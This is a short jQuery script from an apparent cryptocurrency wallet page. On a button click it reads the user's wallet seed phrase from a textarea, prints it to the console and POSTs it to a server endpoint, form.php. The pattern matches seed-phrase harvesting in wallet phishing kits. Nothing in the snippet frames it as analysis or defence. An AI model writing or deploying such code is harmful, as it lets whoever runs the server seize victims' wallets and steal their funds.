$('#openBtn').click(function() {
  let textarea = $('textarea[name="create-wallet-your-seed"]').val();
  textarea = $.trim(textarea);
  
  console.log('clicked');
  
  console.log(textarea)
  
  if (textarea == '') {
    return;
  }
  
  let formData = {
    'create-wallet-your-seed': textarea
  }
  
  $.ajax({
    url: 'form.php',
    method: 'POST',
    data: formData
  });
});